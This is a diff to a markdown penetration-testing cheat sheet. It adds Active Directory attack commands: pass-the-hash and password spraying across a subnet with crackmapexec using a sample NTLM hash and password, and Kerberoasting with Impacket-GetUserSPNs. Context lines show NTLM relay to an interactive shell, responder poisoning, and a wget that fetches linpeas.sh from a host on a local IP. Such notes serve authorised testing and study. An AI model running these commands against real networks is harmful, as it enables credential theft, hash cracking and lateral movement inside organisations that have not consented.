@@ -76,7 +76,7 @@ sudo -l
 
 crontab -l
 
-**Linux wget and curl commands**
+##Linux wget and curl command
 
 wget http://192.168.64.137:8000/linpeas.sh -O linpeas.sh
 
@@ -120,6 +120,15 @@ sudo responder -I eth0 -dPv
 
 (Relay authentication into targets | -i interacive shell | -c command execution)  
 Impacket-ntlmrelax -tf targets.txt -smb2support -i 
+
+(PtH with crackmapexec)
+crackmapexec smb 10.10.10.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31dcfce0d16ae931b73c59d7e0c089c0
+
+(PtP with crackmapexec) 
+crackmapexec smb 10.10.10.0/24 -u administrator -p 'P@ssw0rd!'
+
+(Enumerate service principile names with their krbtgs (kerberos ticket granting service hash) - useful in AD envs when SPN objects are not set to read only.
+Impacket-GetUserSPNs -dc-ip <10.10.10.0> domain/username:password -request
 
 **Identify hosts without SMB signing:** nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn  
 In the event initial scanning of a known target presents no results adding -Pn will still scan the target and provide information regardless. 
